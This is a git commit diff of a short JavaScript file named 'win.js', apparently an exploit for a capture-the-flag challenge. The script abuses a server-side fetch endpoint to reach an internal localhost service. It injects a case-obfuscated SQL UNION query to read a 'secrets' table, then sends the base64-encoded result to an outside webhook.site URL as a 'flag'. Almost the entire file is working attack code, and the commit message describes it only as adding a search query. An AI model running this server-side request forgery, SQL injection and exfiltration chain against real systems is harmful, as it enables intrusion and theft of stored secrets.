2bf3a86ff593dddd3a5244019f513c5c2f047412
bahylol <94308278+bahylol@users.noreply.github.com>
2026-04-19 18:36:10 +0200

    Modify fetch request to include search query

--- win.js
+++ win.js
@@ -2,10 +2,10 @@ fetch('/devtools/fetch', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({
-    url: "http://127.0.0.1:8080/"
+    url: "http://127.0.0.1:8080/search?q=' UnIoN SeLeCt 1,secret,3,4 FrOm secrets WheRe '1'='1"
   })
 })
 .then(r => r.json())
 .then(d => {
-  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?data=' + btoa(d.body));
+  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?flag=' + btoa(d.body));
 });
